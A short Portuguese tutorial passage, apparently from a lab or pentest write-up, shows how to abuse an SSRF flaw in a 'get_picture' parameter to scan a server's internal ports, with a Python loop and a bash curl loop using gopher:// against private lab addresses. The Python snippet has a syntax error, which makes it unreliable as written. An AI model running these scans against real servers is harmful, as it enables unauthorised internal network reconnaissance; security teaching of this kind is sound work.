Por meio do SSRF podemos forçar o servidor a enviar requisições para diferentes portas em um destino específico, permitindo a descoberta de serviços internos e possíveis pontos fracos na infraestrutura. Para explorar essas portas abertas é necessário um script para enumerar as portas:
**Utilizando Python é possível escrever um simples script para isso:**
```
import requests

portas = {21,80,8080}
for port in portas:
	print(f"Porta: {port}")
	r = requests.get(http://10.10.0.5/?get_picture=http://localhost:"+str(port))
	print(r.text)
```
**Utilizando bash para fazer o PortScan**
```
for port in {21,22,23,25,80,80,8080,3306,5432,8443,445,139,9000}; do echo $port; curl -s “http://10.10.0.11/?get_picture=gopher://localhost:$port/_TEST”|cat; done
```

